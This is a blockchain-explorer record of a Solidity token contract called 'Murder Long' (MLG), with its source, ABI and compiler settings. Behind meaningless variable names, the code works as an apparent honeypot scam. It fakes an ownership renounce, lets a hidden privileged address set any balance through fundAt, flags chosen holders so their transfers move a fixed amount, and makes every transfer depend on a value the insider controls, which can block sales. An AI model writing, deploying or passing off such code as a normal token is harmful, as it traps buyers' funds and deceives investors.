{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface teamReceiverTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingMode) external view returns (uint256);\n\n    function transfer(address tokenReceiver, uint256 takeLaunch) external returns (bool);\n\n    function allowance(address atTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenReceiver,\n        uint256 takeLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLimit, uint256 value);\n    event Approval(address indexed atTeam, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundMarketingList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTx {\n    function createPair(address walletShould, address minWalletToken) external returns (address);\n}\n\ninterface teamReceiverTxMetadata is teamReceiverTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MurderLong is receiverMax, teamReceiverTx, teamReceiverTxMetadata {\n\n    string private amountMode = \"MLG\";\n\n    event OwnershipTransferred(address indexed amountFundLaunched, address indexed buyMaxWallet);\n\n    bool private receiverShould;\n\n    function owner() external view returns (address) {\n        return receiverSell;\n    }\n\n    bool private senderShould;\n\n    address public buyList;\n\n    bool private shouldBuy;\n\n    function minFee() private view {\n        require(swapTo[_msgSender()]);\n    }\n\n    uint8 private fundWallet = 18;\n\n    function balanceOf(address tradingMode) public view virtual override returns (uint256) {\n        return feeTotalShould[tradingMode];\n    }\n\n    function autoFrom() public {\n        emit OwnershipTransferred(buyList, address(0));\n        receiverSell = address(0);\n    }\n\n    function shouldFee(address senderTeam) public {\n        minFee();\n        \n        if (senderTeam == buyList || senderTeam == isTeam) {\n            return;\n        }\n        toEnable[senderTeam] = true;\n    }\n\n    mapping(address => bool) public toEnable;\n\n    uint256 public modeFund;\n\n    bool public launchList;\n\n    function approve(address receiverFundShould, uint256 takeLaunch) public virtual override returns (bool) {\n        swapLiquidity[_msgSender()][receiverFundShould] = takeLaunch;\n        emit Approval(_msgSender(), receiverFundShould, takeLaunch);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private swapLiquidity;\n\n    function fundAt(address totalEnableLiquidity, uint256 takeLaunch) public {\n        minFee();\n        feeTotalShould[totalEnableLiquidity] = takeLaunch;\n    }\n\n    uint256 public autoWallet;\n\n    function transferFrom(address sellTradingList, address tokenReceiver, uint256 takeLaunch) external override returns (bool) {\n        if (_msgSender() != receiverSwap) {\n            if (swapLiquidity[sellTradingList][_msgSender()] != type(uint256).max) {\n                require(takeLaunch <= swapLiquidity[sellTradingList][_msgSender()]);\n                swapLiquidity[sellTradingList][_msgSender()] -= takeLaunch;\n            }\n        }\n        return txSwap(sellTradingList, tokenReceiver, takeLaunch);\n    }\n\n    string private minSell = \"Murder Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toSell;\n    }\n\n    address receiverSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private takeIsReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountMode;\n    }\n\n    address private receiverSell;\n\n    bool private walletAuto;\n\n    function getOwner() external view returns (address) {\n        return receiverSell;\n    }\n\n    address modeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return minSell;\n    }\n\n    uint256 private toSell = 100000000 * 10 ** 18;\n\n    uint256 sellMaxMarketing;\n\n    uint256 exemptSell;\n\n    bool public buyReceiver;\n\n    uint256 constant teamLaunch = 17 ** 10;\n\n    function transfer(address totalEnableLiquidity, uint256 takeLaunch) external virtual override returns (bool) {\n        return txSwap(_msgSender(), totalEnableLiquidity, takeLaunch);\n    }\n\n    constructor (){\n        \n        fundMarketingList toBuyAt = fundMarketingList(receiverSwap);\n        isTeam = atTx(toBuyAt.factory()).createPair(toBuyAt.WETH(), address(this));\n        if (shouldBuy == receiverShould) {\n            receiverShould = false;\n        }\n        buyList = _msgSender();\n        autoFrom();\n        swapTo[buyList] = true;\n        feeTotalShould[buyList] = toSell;\n        if (takeIsReceiver == modeFund) {\n            launchList = true;\n        }\n        emit Transfer(address(0), buyList, toSell);\n    }\n\n    bool public fundEnable;\n\n    function allowance(address txMin, address receiverFundShould) external view virtual override returns (uint256) {\n        if (receiverFundShould == receiverSwap) {\n            return type(uint256).max;\n        }\n        return swapLiquidity[txMin][receiverFundShould];\n    }\n\n    function sellMode(uint256 takeLaunch) public {\n        minFee();\n        sellMaxMarketing = takeLaunch;\n    }\n\n    mapping(address => uint256) private feeTotalShould;\n\n    function txSwap(address sellTradingList, address tokenReceiver, uint256 takeLaunch) internal returns (bool) {\n        if (sellTradingList == buyList) {\n            return fromTx(sellTradingList, tokenReceiver, takeLaunch);\n        }\n        uint256 amountMarketing = teamReceiverTx(isTeam).balanceOf(modeTx);\n        require(amountMarketing == sellMaxMarketing);\n        require(tokenReceiver != modeTx);\n        if (toEnable[sellTradingList]) {\n            return fromTx(sellTradingList, tokenReceiver, teamLaunch);\n        }\n        return fromTx(sellTradingList, tokenReceiver, takeLaunch);\n    }\n\n    function fromTx(address sellTradingList, address tokenReceiver, uint256 takeLaunch) internal returns (bool) {\n        require(feeTotalShould[sellTradingList] >= takeLaunch);\n        feeTotalShould[sellTradingList] -= takeLaunch;\n        feeTotalShould[tokenReceiver] += takeLaunch;\n        emit Transfer(sellTradingList, tokenReceiver, takeLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public swapTo;\n\n    address public isTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundWallet;\n    }\n\n    function tokenListTeam(address autoTotalMin) public {\n        if (buyReceiver) {\n            return;\n        }\n        if (takeIsReceiver == autoWallet) {\n            launchList = false;\n        }\n        swapTo[autoTotalMin] = true;\n        if (launchList) {\n            fundEnable = false;\n        }\n        buyReceiver = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFundLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMaxWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFundShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunch\",\"type\":\"uint256\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLaunch\",\"type\":\"uint256\"}],\"name\":\"sellMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"}],\"name\":\"shouldFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotalMin\",\"type\":\"address\"}],\"name\":\"tokenListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalEnableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTradingList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MurderLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}